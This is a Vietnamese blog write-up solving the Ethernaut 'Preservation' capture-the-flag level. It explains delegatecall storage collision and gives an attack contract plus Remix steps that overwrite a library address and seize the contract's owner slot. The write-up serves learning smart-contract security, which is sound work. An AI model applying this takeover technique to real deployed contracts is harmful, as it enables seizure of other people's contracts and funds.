---
layout: post
title: "The Ethernaut: 16 - Preservation"
mathjax: true
---

# 16. Preservation 　★★★★★★

**Nhiệm vụ**: chiếm quyền owner

```js
pragma solidity ^0.4.23;

contract Preservation {

  // public library contracts
  address public timeZone1Library;
  address public timeZone2Library;
  address public owner;
  uint storedTime;
  // Sets the function signature for delegatecall
  bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) public {
    timeZone1Library = _timeZone1LibraryAddress;
    timeZone2Library = _timeZone2LibraryAddress;
    owner = msg.sender;
  }

  // set the time for timezone 1
  function setFirstTime(uint _timeStamp) public {
    timeZone1Library.delegatecall(setTimeSignature, _timeStamp);
  }

  // set the time for timezone 2
  function setSecondTime(uint _timeStamp) public {
    timeZone2Library.delegatecall(setTimeSignature, _timeStamp);
  }
}

// Simple library contract to set the time
contract LibraryContract {

  // stores a timestamp
  uint storedTime;

  function setTime(uint _time) public {
    storedTime = _time;
  }
}
```

## Solution

Có 2 điều ta cần nắm được về `delegatecall`:

**Điều thứ nhất**: `delegatecall` chỉ là mượn hàm từ một contract khác và gọi hàm đó trong contract của mình.

Để diễn giải điều này, ta xét một ví dụ có thể coi là kinh điển về `delegatecall`, search google phát thấy ngay

```js
contract D {
  uint public n;
  address public sender;

  function delegatecallSetN(address _e, uint _n) {
    _e.delegatecall(bytes4(sha3("setN(uint256)")), _n); // D's storage is set, E is not modified
  }
}

contract E {
  uint public n;
  address public sender;
  function setN(uint _n) {
    n = _n;
    sender = msg.sender;
  }
}
```

Trong contract E ta có một hàm là hàm `setN` sẽ thay đổi giá trị của `n` và `sender`. Trong contract D ta gọi hàm `_e.delegatecall(bytes4(sha3("setN(uint256)")), _n);`, điều này tương đương với việc ta chuyển hàm setN vào bên trong contract D như sau:

```js
contract D {
  uint public n;
  address public sender;

  function delegatecallSetN(uint _n) {
    setN(_n);
  }

  function setN(uint _n) {
    n = _n;
    sender = msg.sender;
  }
}
```

**Điều thứ hai**: khi gọi `delegatecall`, các biến của hàm trong contract E sẽ là *biến với slot tương ứng* của contract D, không cần quan tâm đến tên biến và kiểu dữ liệu.

Ví dụ như bên trên, giả sử ta đổi tên biến và kiểu dữ liệu trong contract D như sau:

```js
contract D {
  address public addr;
  bytes20 public mess;

  function delegatecallSetN(address _e, uint _n) {
    _e.delegatecall(bytes4(sha3("setN(uint256)")), _n); // D's storage is set, E is not modified
  }
}

contract E {
  uint public n;
  address public sender;
  function setN(uint _n) {
    n = _n;
    sender = msg.sender;
  }
}
```

khi này trong D, nếu ta gọi `_e.delegatecall(bytes4(sha3("setN(uint256)")), _n);` thì `addr` sẽ được gán cho giá trị của `_n`, tất nhiên có ép kiểu từ `uint` sang `address`, còn `mess` sẽ được gán cho giá trị của `msg.sender`, ép kiểu từ `address` qua `bytes20`.

Các bạn hãy tự test thử trên RemixIDE để hiểu rõ hơn.

Ok vậy là ta đã hiểu về `delegatecall`, trong bài này ta sẽ áp dụng thế nào ?

Cùng nhìn qua contract `LibraryContract`

```js
contract LibraryContract {

  // stores a timestamp
  uint storedTime;

  function setTime(uint _time) public {
    storedTime = _time;
  }
}
```

Contract này có một slot duy nhất chứa `storedTime`, do đó nó sẽ tương ứng với slot của `timeZone1Library` trong contract `Preservation` nếu ta gọi `setTime` bằng `delegatecall`. Điều này có ý nghĩa thế nào?

```js
function setFirstTime(uint _timeStamp) public {
  timeZone1Library.delegatecall(setTimeSignature, _timeStamp);
}
```

nó có nghĩa là nếu ta gọi `setFirstTime` thì `timeZone1Library` sẽ được gán bởi `_timeStamp` một lần duy nhất, vì sau đó địa chỉ `timeZone1Library` sẽ trở thành địa chỉ `_timeStamp` rồi.

```js
function setSecondTime(uint _timeStamp) public {
  timeZone2Library.delegatecall(setTimeSignature, _timeStamp);
}
```

nó có nghĩa là nếu ta gọi `setSecondTime` thì `timeZone1Library` sẽ được gán lại bởi giá trị `_timeStamp` bất cứ khi nào gọi hàm

Từ ý nghĩa này, ta có kịch bản tấn công như sau:

- Thay `timeZone1Library` bằng địa chỉ contract tấn công.
- Do trong contract `Preservation`, biến `owner` ứng với slot thứ 3, nên trong contract tấn công ta sẽ có 3 biến, theo đó nếu gọi bằng `delegatecall`, slot thứ 3 sẽ tương tứng với `owner` trong `Preservation`.
- Trong contract tấn công cũng phải có hàm `setTime` y như `timeZone1Library` và `timeZone2Library`, trong hàm này ta sẽ tiến hành đổi owner sang chính mình (tx.origin)
- Contract tấn công sẽ như sau

```js
contract Attack {
  address public slot1;
  address public slot2;
  address public owner;

  function setTime(uint _time) public {
    owner = tx.origin;
  }
}
```

**Note**: Trong các giao dịch, nhớ cho `gasLimit` cao một chút để tránh bị hết gas

- Trên Remix IDE, load contract `Preservation`

![png]({{site.url}}/assets/images/preservation.png)

- Trên Remix IDE, deploy contract `Attack`

![png]({{site.url}}/assets/images/preservation-attack.png)

- Tại `Preservation`, gọi hàm `setFirstTime` với giá trị là địa chỉ của contract `Attack`, đã được convert ra uint256

![png]({{site.url}}/assets/images/preservation-setfirsttime-1.png)

- Tại `Preservation`, gọi hàm `setFirstTime` lần thứ 2 với giá trị bất kì

![png]({{site.url}}/assets/images/preservation-setfirsttime-2.png)

- Kiếm tra lại xem owner đã là mình chưa ?

![png]({{site.url}}/assets/images/preservation-owner.png)

- Submit & all done!

![completed]({{site.url}}/assets/images/ethernaut-completed.png)

## Bình luận

`delegatecall` và `storage` chưa bao giờ là dễ cả!

Enjoy coding!